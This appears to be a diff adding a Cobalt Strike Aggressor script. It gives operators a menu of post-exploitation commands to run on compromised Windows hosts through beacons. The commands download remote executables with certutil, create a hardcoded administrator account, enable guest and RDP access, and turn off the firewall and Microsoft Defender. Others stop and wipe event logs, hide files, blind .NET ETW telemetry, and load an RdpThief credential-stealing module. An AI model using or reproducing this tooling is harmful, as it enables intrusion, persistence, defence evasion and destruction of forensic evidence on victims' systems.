@@ -1,0 +1,119 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       XWAY.CN@panda        #
+#                            #
+#                            #
+#                            #
+##############################
+menu "System Command" {
+        include(script_resource("modules/RdpThief.cna"));
+
+			    item "Remote download" {
+             prompt_text("Insert remote URL. Will be saved in c:\\windows\\helper.exe", "", lambda({
+            bshell(@ids, "Certutil.exe -urlcache -split -f $1 C:\\windows\\helper.exe");
+        }, @ids => $1));
+    }	
+	
+				item "Activate guest user" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "net user guest /active:yes");
+			}
+		}
+				item "Turn off the firewall" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "netsh advfirewall set allprofiles state off");
+			}
+		}
+				item "Open RDP service"{
+            local('$bid');
+                $bid = $1;
+                if (!-isadmin $bid['@']){
+                    show_error("Permission Denied!");
+                }
+                else{
+                    bshell($bid,"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
+                }
+            }
+				item "Open RDP rules on firewall"{
+            local('$bid');
+                $bid = $1;
+                if (!-isadmin $bid['@']){
+                    show_error("Permission Denied!");
+                }
+                else{
+                    bshell($bid,"netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow");
+                }
+            }
+				item "Add administrator user" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "net user admin123 admin@123 /add");
+				bshell($1, "net localgroup administrators admin123 /add");
+			}
+		}
+			    menu "Hide files" {
+			    item "Hide" {
+             prompt_text("File path", "", lambda({
+            bshell(@ids, "attrib +h +s $1");
+        }, @ids => $1));
+    }	
+			    item "Show" {
+             prompt_text("File path", "", lambda({
+            bshell(@ids, "attrib -h -s $1");
+        }, @ids => $1));
+    }
+	}
+				item "Close MS Defender" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD");
+			}
+		}
+				item "Stop Eventlog" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "sc stop Schedule");
+				bshell($1, "sc stop wecsvc");
+				bshell($1, "sc stop eventlog");
+			}
+		}
+			    item "Clean Eventlog" {
+             prompt_text("ARE U SURE?", lambda({
+            bshell(@ids, "wevtutil cl security");
+			bshell(@ids, "wevtutil cl system");
+			bshell(@ids, "wevtutil cl application");
+			bshell(@ids, "wevtutil cl \"windows powershell\"");
+        }, @ids => $1));
+    }	
+				
+				item "Set beacon path" {
+				$bid = $1;
+				$dialog = dialog("Set beacon path", %(Path => "C:\\Windows\\Temp\\", bid => $bid), &beacon_path);
+				drow_text($dialog, "Path",  "Path: "); 	
+				dbutton_action($dialog, "SET");
+				dialog_show($dialog);
+        }
+sub beacon_path {
+
+    bcd($bid, $3['Path']);
+    }
+	
+menu "Hide .NET behavior" {
+			item "CMD command" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "set COMPlus_ETWEnabled=0");
+			}
+		}
+				item "blocketw" {
+					bexecute_assembly($1, script_resource("/script/blocketw.exe"), "");
+		}
+		}
+
+
+
+}
